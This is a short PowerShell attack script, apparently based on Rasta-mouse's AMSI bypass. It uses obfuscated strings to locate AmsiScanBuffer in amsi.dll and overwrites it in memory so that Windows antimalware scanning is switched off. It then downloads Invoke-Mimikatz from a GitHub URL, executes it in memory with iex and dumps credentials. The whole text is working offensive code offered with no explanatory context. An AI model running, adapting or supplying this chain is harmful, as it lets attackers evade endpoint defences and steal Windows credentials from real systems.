#Rasta-mouses Amsi-Scan-Buffer patch \n
$roylj = @"
using System;
using System.Runtime.InteropServices;
public class roylj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr mvwrcf, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $roylj

$pgpscin = [roylj]::LoadLibrary("$([chaR](97)+[cHaR](109)+[ChaR]([byTe]0x73)+[CHAR]([BYte]0x69)+[ChaR]([byTE]0x2e)+[ChAR](100)+[CHaR](108+31-31)+[chaR](108))")
$wkiloc = [roylj]::GetProcAddress($pgpscin, "$(('ÂmsìSc'+'ànBuff'+'er').NoRMALIzE([ChaR](70*66/66)+[chaR](111*1/1)+[chAR]([BYtE]0x72)+[Char](109*69/69)+[chaR]([bytE]0x44)) -replace [cHar](92)+[CHaR]([bYtE]0x70)+[Char]([Byte]0x7b)+[cHaR]([bYTe]0x4d)+[cHAr]([BYte]0x6e)+[Char]([BYte]0x7d))")
$p = 0
[roylj]::VirtualProtect($wkiloc, [uint32]5, 0x40, [ref]$p)
$pmoi = "0xB8"
$mozr = "0x57"
$anyz = "0x00"
$dazd = "0x07"
$ewxs = "0x80"
$wvbh = "0xC3"
$curqg = [Byte[]] ($pmoi,$mozr,$anyz,$dazd,+$ewxs,+$wvbh)
[System.Runtime.InteropServices.Marshal]::Copy($curqg, 0, $wkiloc, 6)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
